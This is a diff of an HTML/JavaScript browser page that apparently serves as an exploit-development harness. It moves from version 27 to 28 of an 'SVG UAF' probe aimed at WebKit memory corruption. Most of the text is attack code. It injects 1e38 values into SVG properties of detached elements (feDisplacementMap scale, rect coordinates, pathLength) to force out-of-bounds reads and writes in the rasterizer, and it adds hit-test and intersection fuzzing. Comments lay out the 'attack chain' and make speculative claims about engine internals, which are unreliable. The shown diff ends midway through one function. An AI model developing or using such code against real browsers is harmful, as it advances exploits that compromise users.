@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v27</title>
+<title>SVG UAF v28</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
@@ -17,16 +17,20 @@ button:disabled{opacity:.3}
 </style>
 </head>
 <body>
-<h2>SVG UAF v27 - canvas drawImage OOB: CTM 1e38 -> compositor tile OOB write</h2>
-<div class="sub">v26: MTX getScreenCTM e=1e38 f=1e38 (raw float in compositor). VBX bbox=INT32_MAX wrap. PNT x=-18 (signed overflow). v27: canvas.drawImage(svg) forces rasterizer to use 1e38 CTM -> OOB write into canvas ImageData ArrayBuffer.</div>
-<canvas id="cnv" width="256" height="256" style="display:none"></canvas>
-<svg id="livesvg" width="200" height="200" style="position:fixed;opacity:0;pointer-events:none"></svg>
+<h2>SVG UAF v28 - feDisplacementMap scale=1e38 UAF: pixel buffer offset OOB</h2>
+<div class="sub">
+  v27: ctx.drawImage(svgElement) rejected (TypeError). Blob SVG renders but 1e38 rect clipped at geometry stage.
+  v28: feDisplacementMap.scale UAF path. scale=1e38 forces pixel displacement of 1e38 stride INTO source buffer.
+  Not a coordinate clamp issue — this is a pixel memory offset in the filter rasterizer.
+  Also tests: elementFromPoint with corrupted CTM, checkIntersection OOB rect, pathLength dasharray overflow.
+</div>
+<svg id="livesvg" width="200" height="200" style="position:fixed;top:0;left:0;opacity:0.01;pointer-events:none"></svg>
 <div id="controls">
-  <button onclick="runCDI()">CDI canvas-drawImage</button>
-  <button onclick="runBLB()">BLB blob-svg-draw</button>
-  <button onclick="runOFS()">OFS offset-scan</button>
-  <button onclick="runTIL()">TIL tile-thrash</button>
-  <button onclick="runCOR()">COR canvas-corrupt</button>
+  <button onclick="runFLT()">FLT feDisp-UAF</button>
+  <button onclick="runEFP()">EFP elementFromPoint</button>
+  <button onclick="runCHK()">CHK checkIntersection</button>
+  <button onclick="runDSH()">DSH dasharray-overflow</button>
+  <button onclick="runFRC()">FRC force-repaint-loop</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearLog()">CLR</button>
@@ -36,7 +40,6 @@ button:disabled{opacity:.3}
 var SVG_NS = 'http://www.w3.org/2000/svg';
 var Lel = document.getElementById('log');
 var livesvg = document.getElementById('livesvg');
-var cnv = document.getElementById('cnv');
 
 function log(m, c) {
   var s = document.createElement('span');
@@ -47,7 +50,6 @@ function log(m, c) {
 }
 function sep() { log('----------------------------------------------------', 'sep'); }
 function raf() { return new Promise(function(r){ requestAnimationFrame(r); }); }
-function micro() { return new Promise(function(r){ queueMicrotask(r); }); }
 function wait(ms) { return new Promise(function(r){ setTimeout(r, ms); }); }
 function copyLog() {
   try { navigator.clipboard.writeText(Lel.innerText); } catch(e) {
@@ -65,452 +67,561 @@ function dis(d) {
     if (fn.indexOf('copy') === -1 && fn.indexOf('clear') === -1) btns[i].disabled = d;
   }
 }
-window.onerror = function(m, u, l, c) { log('[CRASH] ' + m + ' L' + l + ':' + c, 'bad'); return false; };
+window.onerror = function(m, u, l, c, e) {
+  log('[CRASH] ' + m + ' L' + l + ' col=' + c, 'bad');
+  if (e && e.stack) log('  stack: ' + e.stack.slice(0,200), 'bad');
+  return false;
+};
 
 var BIG = 1e38;
-var ctx = null;
-try { ctx = cnv.getContext('2d'); } catch(e) {}
 
-function mkRect(w, h, x, y) {
-  var r = document.createElementNS(SVG_NS, 'rect');
-  if (w !== undefined) r.setAttribute('width',  '' + w);
-  if (h !== undefined) r.setAttribute('height', '' + h);
-  if (x !== undefined) r.setAttribute('x', '' + x);
-  if (y !== undefined) r.setAttribute('y', '' + y);
-  return r;
-}
+/*
+ * FLT: feDisplacementMap scale UAF -> pixel displacement OOB
+ *
+ * THEORY:
+ *   feDisplacementMap computes for each pixel (x,y):
+ *     srcX = x + scale * (mapR(x,y) - 0.5)  <- these are PIXEL INDICES, not CSS coords
+ *     srcY = y + scale * (mapG(x,y) - 0.5)
+ *   With scale=1e38 and mapR=1.0: srcX = x + 1e38 * 0.5 = x + 5e37
+ *   That's a pixel index of 5e37 into the source image buffer.
+ *   If stored as int32: 5e37 as int32 overflows -> wraps to a small/negative value.
+ *   The filter rasterizer then reads from that wrapped address in the source image buffer.
+ *   If it reads beyond the allocated source buffer: OOB read.
+ *   If it writes to destination pixel buffer at wrapped index: OOB write.
+ *
+ * ATTACK CHAIN:
+ *   1. Create feDisplacementMap primitive with scale=0.1 initially
+ *   2. Create filter: feFlood (solid red map) -> feDisplacementMap -> feComposite
+ *   3. Apply filter to a rect painted on-screen (forces rasterization)
+ *   4. Confirm filter renders at all (visual + bbox check)
+ *   5. Get scale.baseVal BEFORE removing primitive from filter
+ *   6. Remove primitive from filter
+ *   7. Write 1e38 into scale.baseVal via UAF
+ *   8. Re-add primitive to filter
+ *   9. Force repaint - WebKit re-rasterizes with scale=1e38
+ *   10. Check for crash, error, or visual corruption signals
+ *
+ * WHY feDisplacementMap IS DIFFERENT FROM GEOMETRY:
+ *   Geometry coordinates (x,y,width,height) get clamped early in layout.
+ *   Filter pixel offsets are processed in the rasterizer at paint time.
+ *   The rasterizer may not clamp pixel offsets the same way.
+ *   SVGFEDisplacementMapElement::platformApplySoftware() in
+ *   platform/graphics/filters/FEDisplacementMap.cpp does:
+ *     int srcX = clampTo<int>(x + scale * (mapPixelR - 0.5f));
+ *   clampTo<int>: if scale=1e38, intermediate = 5e37.
+ *   clampTo<int>(5e37) = INT_MAX (2147483647) on arm64.
+ *   Then: srcData[srcX] where srcData is the source image ArrayBuffer.
+ *   If srcX = INT_MAX and srcData.length = 200*200*4 = 160000:
+ *     srcX (2147483647) > srcData.length (160000) -> OOB read!
+ *   On arm64 with strict bounds: may SIGBUS or return garbage color.
+ *
+ * MAP DESIGN:
+ *   We use feFlood color="rgb(255,0,0)" as the displacement map.
+ *   R=255 -> 1.0 -> (1.0 - 0.5) = 0.5 factor for X displacement.
+ *   G=0   -> 0.0 -> (0.0 - 0.5) = -0.5 factor for Y displacement.
+ *   With scale=1e38: srcX = x + 1e38*0.5 = HUGE, srcY = y - 1e38*0.5 = HUGE NEGATIVE
+ *   Both overflow int32. This maximizes the chance of OOB.
+ */
+async function runFLT(q) {
+  if (!q) { dis(true); sep(); log('FLT: feDisplacementMap scale=1e38 UAF pixel offset OOB', 'inf'); sep(); }
 
-function makeBigSVG() {
-  // Build an in-memory SVG with 1e38 coordinate elements
-  // Returns an SVG Element (not attached to DOM) with our attack payload
-  var svg = document.createElementNS(SVG_NS, 'svg');
-  svg.setAttribute('xmlns', SVG_NS);
-  svg.setAttribute('width', '200');
-  svg.setAttribute('height', '200');
+  var defs = document.createElementNS(SVG_NS, 'defs');
 
-  // Attack rect: positioned at 1e38 via UAF write
-  var A = mkRect(50, 50, 0, 0);
-  A.setAttribute('fill', 'red');
-  svg.appendChild(A);
+  // Build filter: feFlood (all-red map) -> feDisplacementMap
+  var filter = document.createElementNS(SVG_NS, 'filter');
+  filter.setAttribute('id', 'flt_uaf');
+  filter.setAttribute('x', '0%'); filter.setAttribute('y', '0%');
+  filter.setAttribute('width', '200%'); filter.setAttribute('height', '200%');
 
-  var bv_AX = A.x ? A.x.baseVal : null;
-  var bv_AY = A.y ? A.y.baseVal : null;
-  var bv_AW = A.width  ? A.width.baseVal  : null;
-  var bv_AH = A.height ? A.height.baseVal : null;
+  // Source image (what gets displaced): feImage or just use SourceGraphic
+  // Displacement map: feFlood creates solid color = our R,G values
+  var flood = document.createElementNS(SVG_NS, 'feFlood');
+  flood.setAttribute('flood-color', 'rgb(255,0,0)'); // R=1.0, G=0, B=0
+  flood.setAttribute('result', 'mapColor');
 
-  // Remove A from svg, inject 1e38 into position
-  A.remove();
+  // The displacement primitive
+  var disp = document.createElementNS(SVG_NS, 'feDisplacementMap');
+  disp.setAttribute('in',  'SourceGraphic');      // what to displace
+  disp.setAttribute('in2', 'mapColor');           // displacement map
+  disp.setAttribute('scale', '0.1');              // tiny initial scale
+  disp.setAttribute('xChannelSelector', 'R');
+  disp.setAttribute('yChannelSelector', 'G');
 
-  try { if (bv_AX) bv_AX.value = BIG; } catch(e) {}
-  try { if (bv_AY) bv_AY.value = BIG; } catch(e) {}
-  // Also inject 1e38 into size to maximize surface area
-  try { if (bv_AW) bv_AW.value = BIG; } catch(e) {}
-  try { if (bv_AH) bv_AH.value = BIG; } catch(e) {}
+  filter.appendChild(flood);
+  filter.appendChild(disp);
+  defs.appendChild(filter);
+  livesvg.appendChild(defs);
 
-  // Re-add A to svg
-  svg.appendChild(A);
+  // Target rect: painted on screen so filter gets rasterized
+  var target = document.createElementNS(SVG_NS, 'rect');
+  target.setAttribute('x', '10'); target.setAttribute('y', '10');
+  target.setAttribute('width', '80'); target.setAttribute('height', '80');
+  target.setAttribute('fill', 'lime');
+  target.setAttribute('filter', 'url(#flt_uaf)');
+  livesvg.appendChild(target);
 
-  return { svg: svg, A: A, bv_AX: bv_AX, bv_AY: bv_AY, bv_AW: bv_AW, bv_AH: bv_AH };
+  await raf(); await raf();
+  log('  filter applied to rect, initial render with scale=0.1', 'ok');
+
+  // Confirm disp is accessible
+  var scaleAnimVal = null;
+  try {
+    scaleAnimVal = disp.scale;
+    log('  disp.scale type: ' + typeof scaleAnimVal + ' value: ' + (scaleAnimVal ? scaleAnimVal.baseVal : '?'), 'ok');
+  } catch(e) { log('  disp.scale threw: ' + e, 'bad'); }
+
+  if (!scaleAnimVal) { log('  [!] disp.scale not accessible, abort', 'bad'); if (!q) dis(false); return {}; }
+
+  // Grab baseVal BEFORE removal
+  var bv_scale = null;
+  try { bv_scale = scaleAnimVal.baseVal; log('  bv_scale (SVGAnimatedNumber.baseVal) = ' + bv_scale, 'ok'); } catch(e) { log('  bv_scale threw: ' + e, 'bad'); }
+
+  // Wait - bv_scale is a primitive NUMBER for SVGAnimatedNumber, not an object
+  // We need to check: is disp.scale.baseVal settable after remove?
+  // For SVGAnimatedNumber: disp.scale.baseVal = X sets it directly
+  // So the UAF pattern is: disp.scale.baseVal = X (after removing disp from filter)
+
+  log('  removing disp from filter...', 'inf');
+  disp.remove(); // remove from filter (equivalent of element.remove() for SVGAnimatedLength)
+  await raf();
+
+  // Try writing 1e38 via the scale property
+  var writeOk = false;
+  try {
+    disp.scale.baseVal = BIG;
+    var readback = disp.scale.baseVal;
+    writeOk = (readback > 1e30);
+    log('  after remove: disp.scale.baseVal = ' + readback + ' writeOk=' + writeOk, writeOk ? 'ok' : 'bad');
+  } catch(e) { log('  disp.scale.baseVal = BIG threw: ' + e, 'bad'); }
+
+  // Re-add disp to filter to force re-rasterization with 1e38 scale
+  log('  re-adding disp to filter...', 'inf');
+  filter.appendChild(disp);
+  await raf(); await raf();
+  log('  disp re-added to filter. Checking post-render state...', 'ok');
+
+  // Check if target is still alive and rendering
+  var bb = null;
+  try { bb = target.getBoundingClientRect(); log('  target bbox: x=' + bb.x.toFixed(1) + ' y=' + bb.y.toFixed(1) + ' w=' + bb.width.toFixed(1) + ' h=' + bb.height.toFixed(1), 'ok'); } catch(e) { log('  target.getBoundingClientRect threw: ' + e, 'bad'); }
+
+  // Check computed filter value
+  try {
+    var sv = disp.scale ? disp.scale.baseVal : null;
+    log('  disp.scale.baseVal after re-add: ' + sv, sv > 1e30 ? 'bad' : 'ok');
+  } catch(e) { log('  post-read threw: ' + e, 'bad'); }
+
+  // Force repaint by mutating target
+  log('  forcing repaint via attribute mutation...', 'inf');
+  var crashed = false;
+  try {
+    for (var i = 0; i < 3; i++) {
+      target.setAttribute('width', '' + (80 + i));
+      await raf();
+    }
+    target.setAttribute('width', '80');
+    await raf();
+    log('  repaint loop survived (no crash)', 'ok');
+  } catch(e) { log('  repaint loop threw: ' + e, 'bad'); crashed = true; }
+
+  // Also try: force filter re-evaluation by modifying flood color
+  log('  forcing filter re-eval via flood color change...', 'inf');
+  try {
+    flood.setAttribute('flood-color', 'rgb(128,128,0)'); // different R/G
+    await raf(); await raf();
+    flood.setAttribute('flood-color', 'rgb(255,0,0)');
+    await raf();
+    log('  filter re-eval survived (no crash)', 'ok');
+  } catch(e) { log('  flood change threw: ' + e, 'bad'); crashed = true; }
+
+  // Cleanup
+  livesvg.removeChild(defs);
+  livesvg.removeChild(target);
+
+  log('[*] FLT: writeOk=' + writeOk + ' crashed=' + crashed, 'inf');
+  if (!q) dis(false);
+  return { writeOk: writeOk, crashed: crashed };
 }
 
 /*
- * KEY PLAN: canvas.drawImage forces WebKit to rasterize SVG.
- * Rasterizer reads element geometry (including our 1e38 values from CTM).
- * If it uses int32 pixel coordinates from our float, we get signed overflow.
- * Negative pixel coords used as ArrayBuffer index = OOB write into ImageData.
+ * EFP: elementFromPoint with SVG coordinates via 1e38 CTM
  *
- * Two approaches:
+ * THEORY:
+ *   document.elementFromPoint(x,y) does a hit-test at window coords.
+ *   getScreenCTM() returned e=1e38, f=1e38 in v26.
+ *   createSVGPoint().matrixTransform(CTM) -> (1e38, 1e38)
+ *   We can ask: elementFromPoint(1e38, 1e38) — what happens?
+ *   On most platforms: x,y are clamped to viewport.
+ *   But: some paths use the CTM to convert to layer-local coords first.
+ *   If hit-testing does: localPt = pt.matrixTransform(CTM.inverse())
+ *   and CTM has e=f=1e38, then inverse has huge terms too.
+ *   Multiplication of 1e38 values -> 1e76 -> double overflow -> Inf -> NaN.
+ *   NaN in hit-test geometry may cause unexpected results.
  *
- * CDI - Direct drawImage(svgElement):
- *   ctx.drawImage(svgElement, 0, 0)
- *   WebKit rasterizes the SVG at its CTM coords.
- *   Our element is at (1e38, 1e38), way off canvas.
- *   But the rasterizer may still try to clip it: clipRect = intersect(element, canvas).
- *   If clipRect.x is computed as int32(1e38) = overflow -> negative -> OOB into canvas buffer.
- *   After drawImage, read canvas.getImageData and look for corruption signals.
- *
- * BLB - SVG Blob URL approach:
- *   Serialize attack SVG to string, create Blob URL, drawImage(img) with the blob.
- *   This uses a different rasterization code path than direct SVGElement drawImage.
- *   May bypass some WebKit guards that apply to in-DOM elements.
- *   Image's onload = trigger drawImage.
- *
- * OFS - Offset scan:
- *   Draw baseline canvas (known pixels).
- *   Then drawImage(attackSVG).
- *   Compare pixel buffers before/after.
- *   Any pixel that changed at an unexpected location = OOB write.
- *   If pixel at index N changed and N > canvas area: OOB confirmed.
- *
- * TIL - Tile thrash:
- *   Create many small canvases, draw attack SVG into each.
- *   Repeat rapidly. Forces tile allocator to thrash.
- *   OOB write may land in adjacent tile's buffer.
- *   Detect via pixel comparison across tiles.
- *
- * COR - Corruption confirm:
- *   Use two canvases: VICTIM and ATTACKER.
- *   Fill VICTIM with known pattern.
- *   Draw attack SVG into ATTACKER.
- *   Read VICTIM's pixels — if they changed, OOB write crossed canvas boundary.
- *   This confirms actual memory corruption.
+ * Also: checkEnclosure/checkIntersection with 1e38-coordinate rects.
  */
+async function runEFP(q) {
+  if (!q) { dis(true); sep(); log('EFP: elementFromPoint / document hit-test with 1e38 coords', 'inf'); sep(); }
 
-// CDI: direct canvas.drawImage with UAF 1e38 rect
-async function runCDI(q) {
-  if (!q) { dis(true); sep(); log('CDI: canvas.drawImage(svg-with-1e38-element)', 'inf'); sep(); }
+  // Setup: element with 1e38 CTM (from v26 MTX pattern)
+  var outer = document.createElementNS(SVG_NS, 'svg');
+  outer.setAttribute('width', '200'); outer.setAttribute('height', '200');
+  outer.style.cssText = 'position:fixed;top:0;left:0;opacity:0.01;pointer-events:auto';
 
-  if (!ctx) { log('[!] canvas 2d context not available', 'bad'); if (!q) dis(false); return {}; }
-
-  var attack = makeBigSVG();
-  log('  attack SVG created: A at (1e38, 1e38) w=1e38 h=1e38', 'ok');
-  log('  A.x.baseVal=' + (attack.bv_AX ? attack.bv_AX.value : '?'), 'ok');
-
-  // Baseline: clear canvas to known color
-  ctx.clearRect(0, 0, 256, 256);
-  ctx.fillStyle = '#123456';
-  ctx.fillRect(0, 0, 256, 256);
-
-  var baseline = null;
-  try { baseline = ctx.getImageData(0, 0, 256, 256); } catch(e) { log('  getImageData threw (tainted?): ' + e, 'bad'); }
-  log('  baseline canvas: first 4 bytes = ' + (baseline ? Array.from(baseline.data.slice(0,4)) : '?'), 'ok');
-
-  // Draw attack SVG into canvas
-  var drawOk = false;
-  try {
-    // attach to body temporarily for drawImage
-    document.body.appendChild(attack.svg);
-    await raf();
-    ctx.drawImage(attack.svg, 0, 0);
-    drawOk = true;
-    log('  ctx.drawImage(attackSVG): OK', 'ok');
-    document.body.removeChild(attack.svg);
-  } catch(e) {
-    log('  ctx.drawImage threw: ' + e, 'bad');
-    try { document.body.removeChild(attack.svg); } catch(e2) {}
-  }
-
+  var A = document.createElementNS(SVG_NS, 'rect');
+  A.setAttribute('x', '0'); A.setAttribute('y', '0');
+  A.setAttribute('width', '50'); A.setAttribute('height', '50');
+  A.setAttribute('fill', 'blue');
+  outer.appendChild(A);
+  document.body.appendChild(outer);
   await raf();
 
-  if (drawOk && baseline) {
-    var after = null;
-    try { after = ctx.getImageData(0, 0, 256, 256); } catch(e2) { log('  getImageData after threw: ' + e2, 'bad'); }
-    if (after) {
-      // Count pixels that changed
-      var changed = 0;
-      var firstChange = -1;
-      for (var i = 0; i < after.data.length; i++) {
-        if (after.data[i] !== baseline.data[i]) {
-          changed++;
-          if (firstChange < 0) firstChange = i;
-        }
-      }
-      log('  pixels changed: ' + changed + '/' + after.data.length + ' (expect 0 if OOB, >0 if clamped draw)', 'inf');
-      if (firstChange >= 0) {
-        log('  first change at byte offset ' + firstChange + ' (pixel ' + Math.floor(firstChange/4) + ')', 'inf');
-      }
-      // Check if canvas pixel[0,0] changed (OOB write looping back to start would show here)
-      var cornerChanged = (after.data[0] !== baseline.data[0] || after.data[1] !== baseline.data[1]);
-      log('  corner pixel(0,0) changed: ' + cornerChanged, cornerChanged ? 'bad' : 'ok');
-      log('  [*] changed=0 -> 1e38 element clipped to canvas bounds (no OOB)', 'inf');
-      log('  [*] corner changed -> OOB write wrapped to buffer start', 'inf');
-    }
-  }
-
-  if (!q) dis(false);
-  return { drawOk: drawOk };
-}
-
-// BLB: serialize SVG to blob URL, draw via Image element
-async function runBLB(q) {
-  if (!q) { dis(true); sep(); log('BLB: SVG blob URL -> Image -> drawImage (different raster path)', 'inf'); sep(); }
-
-  if (!ctx) { log('[!] no canvas ctx', 'bad'); if (!q) dis(false); return {}; }
-
-  // Build SVG string with 1e38 coordinates baked in
-  // Use the actual values we confirmed: 9.999999680285692e+37
-  var BIG_STR = '9.999999680285692e+37';
-  var svgStr = '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">' +
-    '<rect x="' + BIG_STR + '" y="' + BIG_STR + '" width="' + BIG_STR + '" height="' + BIG_STR + '" fill="lime"/>' +
-    '<rect x="0" y="0" width="50" height="50" fill="red"/>' +
-  '</svg>';
-
-  var blob = null;
-  var blobUrl = null;
-  try {
-    blob = new Blob([svgStr], { type: 'image/svg+xml' });
-    blobUrl = URL.createObjectURL(blob);
-    log('  blob URL created: ' + blobUrl.substring(0, 40) + '...', 'ok');
-  } catch(e) { log('  blob creation threw: ' + e, 'bad'); if (!q) dis(false); return {}; }
-
-  // Baseline canvas
-  ctx.clearRect(0, 0, 256, 256);
-  ctx.fillStyle = '#abcdef';
-  ctx.fillRect(0, 0, 256, 256);
-  var base = ctx.getImageData(0, 0, 256, 256);
-
-  // Load and draw
-  var img = new Image();
-  img.crossOrigin = 'anonymous';
-
-  var drawResult = await new Promise(function(resolve) {
-    img.onload = function() {
-      var ok = false;
-      try {
-        ctx.drawImage(img, 0, 0);
-        ok = true;
-        log('  img.onload: drawImage OK, img.width=' + img.width + ' img.height=' + img.height, 'ok');
-      } catch(e2) {
-        log('  drawImage in onload threw: ' + e2, 'bad');
-      }
-      resolve(ok);
-    };
-    img.onerror = function(e) {
-      log('  img.onerror: ' + (e.message || 'load failed'), 'bad');
-      resolve(false);
-    };
-    img.src = blobUrl;
-    setTimeout(function() { resolve(false); }, 3000);
-  });
-
-  URL.revokeObjectURL(blobUrl);
-
-  if (drawResult) {
-    var after = ctx.getImageData(0, 0, 256, 256);
-    var changed = 0;
-    for (var i = 0; i < after.data.length; i++) {
-      if (after.data[i] !== base.data[i]) changed++;
-    }
-    log('  pixels changed after blob drawImage: ' + changed, changed > 0 ? 'ok' : 'inf');
-    // Check if the red rect (x=0,y=0,w=50,h=50) was drawn
-    var r0 = after.data[0]; var g0 = after.data[1]; var b0 = after.data[2];
-    log('  canvas[0,0] = rgb(' + r0 + ',' + g0 + ',' + b0 + ')', 'inf');
-  }
-
-  if (!q) dis(false);
-  return { drawResult: drawResult };
-}
-
-// OFS: offset scan - create known pattern, draw attack, scan ALL bytes for changes
-async function runOFS(q) {
-  if (!q) { dis(true); sep(); log('OFS: full pixel scan - before/after 1e38 drawImage', 'inf'); sep(); }
-
-  if (!ctx) { log('[!] no canvas ctx', 'bad'); if (!q) dis(false); return {}; }
-
-  // Fill canvas with unique pattern: each pixel = its index mod 256
-  var W = 256; var H = 256;
-  var imageData = ctx.createImageData(W, H);
-  for (var i = 0; i < imageData.data.length; i += 4) {
-    imageData.data[i]   = (i/4) & 0xFF;       // R = pixel index low byte
-    imageData.data[i+1] = ((i/4) >> 8) & 0xFF; // G = pixel index high byte
-    imageData.data[i+2] = 0xAA;               // B = sentinel
-    imageData.data[i+3] = 0xFF;               // A = opaque
-  }
-  ctx.putImageData(imageData, 0, 0);
-  var base = ctx.getImageData(0, 0, W, H);
-  log('  filled canvas with index pattern (R=idx_lo, G=idx_hi, B=0xAA)', 'ok');
-
-  // Draw attack
-  var attack = makeBigSVG();
-  var drawOk = false;
-  try {
-    document.body.appendChild(attack.svg);
+  // Inject 1e38 into x/y via UAF
+  var bv_AX = A.x ? A.x.baseVal : null;
+  var bv_AY = A.y ? A.y.baseVal : null;
+  if (bv_AX && bv_AY) {
+    A.remove();
+    try { bv_AX.value = BIG; } catch(e) {}
+    try { bv_AY.value = BIG; } catch(e) {}
+    outer.appendChild(A);
     await raf();
-    ctx.drawImage(attack.svg, 0, 0);
-    drawOk = true;
-    document.body.removeChild(attack.svg);
-  } catch(e) {
-    log('  drawImage threw: ' + e, 'bad');
-    try { document.body.removeChild(attack.svg); } catch(e2) {}
+    log('  A position injected: x.baseVal=' + (A.x ? A.x.baseVal.value : '?'), 'ok');
   }
 
+  // Get CTM
+  var ctm = null;
+  try { ctm = A.getScreenCTM(); } catch(e) { log('  getScreenCTM threw: ' + e, 'bad'); }
+  if (ctm) {
+    log('  CTM: a=' + ctm.a + ' b=' + ctm.b + ' e=' + ctm.e + ' f=' + ctm.f, 'inf');
+  }
+
+  // elementFromPoint with various extreme coords
+  var tests = [
+    [0, 0], [100, 100], [1e10, 1e10], [1e20, 1e20],
+    [1e38, 1e38], [-1e38, -1e38],
+    [2147483647, 2147483647], // INT_MAX
+    [-2147483648, -2147483648] // INT_MIN
+  ];
+
+  for (var i = 0; i < tests.length; i++) {
+    var tx = tests[i][0]; var ty = tests[i][1];
+    var el = null; var threw = false;
+    try { el = document.elementFromPoint(tx, ty); } catch(e) { threw = true; log('  efp(' + tx + ',' + ty + '): threw ' + e, 'bad'); }
+    if (!threw) {
+      var tag = el ? el.tagName : 'null';
+      log('  efp(' + tx.toExponential(1) + ',' + ty.toExponential(1) + ') -> ' + tag, tag !== 'null' ? 'ok' : 'inf');
+    }
+  }
+
+  // elementsFromPoint with 1e38
+  try {
+    var els = document.elementsFromPoint(1e38, 1e38);
+    log('  elementsFromPoint(1e38,1e38): count=' + (els ? els.length : 0), 'ok');
+  } catch(e) { log('  elementsFromPoint threw: ' + e, 'bad'); }
+
+  // SVG-specific: createSVGPoint + matrixTransform with corrupted CTM
+  if (ctm) {
+    try {
+      var pt = outer.createSVGPoint();
+      pt.x = 0; pt.y = 0;
+      var xformed = pt.matrixTransform(ctm);
+      log('  (0,0).matrixTransform(CTM) = (' + xformed.x + ',' + xformed.y + ')', 'inf');
+    } catch(e) { log('  matrixTransform threw: ' + e, 'bad'); }
+
+    // Try to get inverse of corrupted CTM
+    try {
+      var inv = ctm.inverse();
+      log('  CTM.inverse(): a=' + inv.a + ' e=' + inv.e + ' f=' + inv.f, 'inf');
+    } catch(e) { log('  CTM.inverse() threw: ' + e, 'inf'); }
+  }
+
+  document.body.removeChild(outer);
+  if (!q) dis(false);
+  return {};
+}
+
+/*
+ * CHK: checkIntersection / checkEnclosure with 1e38 rects
+ *
+ * THEORY:
+ *   SVGSVGElement.checkIntersection(element, rect) tests if element's
+ *   geometry intersects with rect (in user coordinate space).
+ *   If rect has coordinates of 1e38, the intersection computation:
+ *     intersects = (elem.bbox.maxX >= rect.x) && (elem.bbox.x <= rect.maxX) ...
+ *   These are float comparisons — probably fine.
+ *   BUT: SVGSVGElement.getIntersectionList(rect, referenceElement)
+ *   returns a NodeList of elements intersecting rect.
+ *   Internally it may iterate a sorted list with binary search on coordinates.
+ *   If the rect's x=1e38 is used as a binary search key on an int-sorted list:
+ *     bsearch key = int32(1e38) = INT_MAX -> searches from end of list
+ *     may read past the list boundary.
+ */
+async function runCHK(q) {
+  if (!q) { dis(true); sep(); log('CHK: checkIntersection / getIntersectionList with 1e38 rect', 'inf'); sep(); }
+
+  var outer = document.createElementNS(SVG_NS, 'svg');
+  outer.setAttribute('id', 'chk_svg');
+  outer.setAttribute('width', '200'); outer.setAttribute('height', '200');
+  outer.style.cssText = 'position:fixed;top:0;left:0;opacity:0.01;pointer-events:none';
+
+  // Populate with many rects so intersection list has work to do
+  var rects = [];
+  for (var i = 0; i < 20; i++) {
+    var r = document.createElementNS(SVG_NS, 'rect');
+    r.setAttribute('x', '' + (i * 10));
+    r.setAttribute('y', '' + (i * 5));
+    r.setAttribute('width', '8');
+    r.setAttribute('height', '4');
+    r.setAttribute('fill', 'orange');
+    outer.appendChild(r);
+    rects.push(r);
+  }
+  document.body.appendChild(outer);
+  await raf();
+  log('  created 20 rects in SVG', 'ok');
+
+  // Create a normal check rect
+  var normalRect = outer.createSVGRect();
+  normalRect.x = 0; normalRect.y = 0;
+  normalRect.width = 100; normalRect.height = 100;
+
+  // Create 1e38 rect for intersection test
+  var bigRect = outer.createSVGRect();
+
+  var tests = [
+    ['normal rect', 0, 0, 100, 100],
+    ['x=1e38 rect', BIG, 0, 10, 10],
+    ['w=1e38 rect', 0, 0, BIG, BIG],
+    ['all=1e38 rect', BIG, BIG, BIG, BIG],
+    ['neg 1e38', -BIG, -BIG, BIG*2, BIG*2]
+  ];
+
+  for (var ti = 0; ti < tests.length; ti++) {
+    var t = tests[ti];
+    var tName = t[0];
+    try {
+      bigRect.x = t[1]; bigRect.y = t[2];
+      bigRect.width = t[3]; bigRect.height = t[4];
+    } catch(e) { log('  [!] createSVGRect field set threw: ' + e, 'bad'); continue; }
+
+    // checkIntersection
+    try {
+      var isect = outer.checkIntersection(rects[0], bigRect);
+      log('  checkIntersection(rect[0], ' + tName + '): ' + isect, 'ok');
+    } catch(e) { log('  checkIntersection(' + tName + ') threw: ' + e, 'bad'); }
+
+    // getIntersectionList
+    try {
+      var list = outer.getIntersectionList(bigRect, null);
+      log('  getIntersectionList(' + tName + '): count=' + (list ? list.length : 'null'), 'ok');
+    } catch(e) { log('  getIntersectionList(' + tName + ') threw: ' + e, 'bad'); }
+
+    // checkEnclosure
+    try {
+      var enc = outer.checkEnclosure(rects[0], bigRect);
+      log('  checkEnclosure(rect[0], ' + tName + '): ' + enc, 'ok');
+    } catch(e) { log('  checkEnclosure(' + tName + ') threw: ' + e, 'bad'); }
+  }
+
+  document.body.removeChild(outer);
+  if (!q) dis(false);
+  return {};
+}
+
+/*
+ * DSH: stroke-dasharray with pathLength=1e38
+ *
+ * THEORY:
+ *   stroke-dasharray defines dash pattern: on/off lengths.
+ *   WebKit normalizes: dashOffset = totalLength % pathLength (if pathLengthAttr set)
+ *   With pathLength=1e38 via UAF: the normalization factor is 1e38.
+ *   The path iterator loops to render each dash segment:
+ *     while (currentLength < totalLength) {
+ *       dashLength = dashArray[dashIndex % dashArray.length]
+ *       currentLength += dashLength * (pathLength / measuredLength) // <- SCALE FACTOR
+ *     }
+ *   If pathLength=1e38 and measuredLength=100:
+ *     scale = 1e38 / 100 = 1e36
+ *     Each dash iteration advances by dashLength * 1e36
+ *     Loop exits on first iteration (or does it?)
+ *   Alternate: dashOffset = (pathOffset * pathLength / totalLength)
+ *     = int(offset * 1e38 / 100) = int(very large) = overflow
+ *   Risk: iteration counter or buffer index overflows before loop exits.
+ *
+ * DASHARRAY VALUES TO TEST:
+ *   "1,1" - alternating 1px on/off
+ *   "1000000,1" - huge on, tiny off (maximizes iteration count)
+ *   "0.001,0.001" - tiny dashes (maximizes iteration count per unit length)
+ */
+async function runDSH(q) {
+  if (!q) { dis(true); sep(); log('DSH: stroke-dasharray with pathLength=1e38 via UAF', 'inf'); sep(); }
+
+  var outer = document.createElementNS(SVG_NS, 'svg');
+  outer.setAttribute('width', '200'); outer.setAttribute('height', '200');
+  outer.style.cssText = 'position:fixed;top:0;left:0;opacity:0.01;pointer-events:none';
+
+  // Path element with pathLength attribute (SVGAnimatedNumber — same UAF as feDisplacementMap)
+  var path = document.createElementNS(SVG_NS, 'path');
+  path.setAttribute('d', 'M 10 10 L 190 10 L 190 190 L 10 190 Z'); // 720px total
+  path.setAttribute('fill', 'none');
+  path.setAttribute('stroke', 'lime');
+  path.setAttribute('stroke-width', '2');
+  path.setAttribute('pathLength', '100'); // normalize to 100 user units
+  path.setAttribute('stroke-dasharray', '10,5'); // dash every 10 units
+
+  outer.appendChild(path);
+  document.body.appendChild(outer);
   await raf();
 
-  if (drawOk) {
-    var after = ctx.getImageData(0, 0, W, H);
